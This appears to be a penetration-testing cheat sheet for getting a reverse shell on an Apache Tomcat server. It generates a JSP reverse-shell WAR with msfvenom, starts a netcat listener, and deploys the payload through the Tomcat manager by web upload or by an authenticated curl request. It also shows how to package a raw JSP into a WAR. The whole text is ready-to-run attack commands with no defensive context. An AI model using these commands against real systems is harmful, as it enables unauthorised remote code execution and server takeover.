### create war payload for reverse shell
```
msfvenom -p java/jsp_shell_reverse_tcp lhost=<lhost> lport=<lport> -f war > <file>.war
```

### start listener 
```
nc -lvp <lport>
<domain>/manager/html > Select WAR file to upload > Deploy
Applications > Path > <file>
```

### alternatively you can use a jsp file
```
msfvenom -p java/jsp_shell_reverse_tcp lhost=<lhost> lport=<lport> -f raw > <file2>.jsp
```

### convert jsp to war
```
jar -cvf <file>.war <file2>.jsp
```

### upload file using curl
```
curl -T <file>.war -u "<user>:<password>" http://<rhost>:<rport>/manager/text/deploy?path=<file>
```

